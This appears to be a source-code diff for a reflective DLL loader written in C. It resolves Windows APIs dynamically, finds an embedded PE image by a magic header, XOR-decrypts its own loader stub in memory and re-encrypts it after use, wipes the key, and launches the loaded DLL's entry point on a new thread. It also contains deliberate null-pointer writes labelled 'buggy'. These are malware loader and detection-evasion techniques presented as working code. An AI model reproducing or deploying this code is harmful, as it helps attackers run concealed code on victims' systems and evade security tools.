@@ -563,11 +563,13 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 	if ((func_CreateThread = (fnCreateThread)GPAR(GMHR(kernel32), str_create_thread)) == NULL)
 		return FALSE;
 
-	fnDllMain p_dll_main = NULL;
+	fnDllMain dll_main = NULL;
 	PBYTE pebase = NULL;
-	PIMAGE_DOS_HEADER p_img_dos_hdr = NULL;
-	PIMAGE_NT_HEADERS p_img_nt_hdrs = NULL;
-	PDLL_HEADER p_dll_header = NULL;
+	PIMAGE_DOS_HEADER img_dos_hdr = NULL;
+	PIMAGE_NT_HEADERS img_nt_hdrs = NULL;
+
+
+	PDLL_HEADER dll_header = NULL;
 	ULONG_PTR dll_base_addr = NULL;
 
 	// lea rax, [rip + 0x0]
@@ -576,15 +578,15 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 	while (TRUE)
 	{
 
-		p_dll_header = (PDLL_HEADER)dll_base_addr;
+		dll_header = (PDLL_HEADER)dll_base_addr;
 
-		if (p_dll_header->header == 0x44434241) {
-			p_img_dos_hdr = (PIMAGE_DOS_HEADER)(dll_base_addr + sizeof(DLL_HEADER));
-			if (p_img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
+		if (dll_header->header == 0x44434241) {
+			img_dos_hdr = (PIMAGE_DOS_HEADER)(dll_base_addr + sizeof(DLL_HEADER));
+			if (img_dos_hdr->e_magic == IMAGE_DOS_SIGNATURE)
 			{
-				p_img_nt_hdrs = (PIMAGE_NT_HEADERS)(dll_base_addr + p_img_dos_hdr->e_lfanew + sizeof(DLL_HEADER));
+				img_nt_hdrs = (PIMAGE_NT_HEADERS)(dll_base_addr + img_dos_hdr->e_lfanew + sizeof(DLL_HEADER));
 
-				if (p_img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
+				if (img_nt_hdrs->Signature == IMAGE_NT_SIGNATURE)
 				{
 					break;
 				}
@@ -600,16 +602,16 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 
 	PBYTE reflective_addr = NULL;
 	BYTE KEY[4] = {
-		(BYTE)(p_dll_header->key & 0xFF),
-		(BYTE)((p_dll_header->key >> 8) & 0xFF),
-		(BYTE)((p_dll_header->key >> 16) & 0xFF),
-		(BYTE)((p_dll_header->key >> 24) & 0xFF),
+		(BYTE)(dll_header->key & 0xFF),
+		(BYTE)((dll_header->key >> 8) & 0xFF),
+		(BYTE)((dll_header->key >> 16) & 0xFF),
+		(BYTE)((dll_header->key >> 24) & 0xFF),
 	};
 
 	reflective_addr = (PBYTE)resolve_jmp_to_actual_function( ReflectiveFunction );
 
 	// decrypting the reflective function
-	for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
+	for (size_t i = 0, j = 0; i < (dll_header->funcSize); i++, j++)
 	{
 		reflective_addr[i] ^= KEY[j % 4];
 	}
@@ -617,23 +619,28 @@ EXTERN_DLL_EXPORT bool _123321_asdf21425()
 	pebase = ReflectiveFunction();
 
 	// re-encrypting the reflective function
-	for (size_t i = 0, j = 0; i < (p_dll_header->funcSize); i++, j++)
+	for (size_t i = 0, j = 0; i < (dll_header->funcSize); i++, j++)
 	{
 		reflective_addr[i] ^= KEY[j % 4];
 	}
 
-	p_dll_header->key = { 0 };
+	dll_header->key = { 0 };
 
-	p_dll_main = (fnDllMain)(pebase + p_img_nt_hdrs->OptionalHeader.AddressOfEntryPoint);
+	PIMAGE_OPTIONAL_HEADER img_opt_hdr = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)img_nt_hdrs
+		+ sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)); // skip nt_hdrs->Signature
 
-	// buggy
-	int* p = 0;
-	*p = 1;
+	dll_main = (fnDllMain)(pebase + img_opt_hdr->AddressOfEntryPoint);
+
+	void** buggy = NULL;
+	*buggy = (void*)img_opt_hdr->AddressOfEntryPoint;
+
 
 	HANDLE h_thread = func_CreateThread(
 		NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc,
-		(LPVOID)p_dll_main, 0, NULL
+		(LPVOID)dll_main, 0, NULL
 	);
+
+
 
 	if (h_thread == NULL)
 		return FALSE;
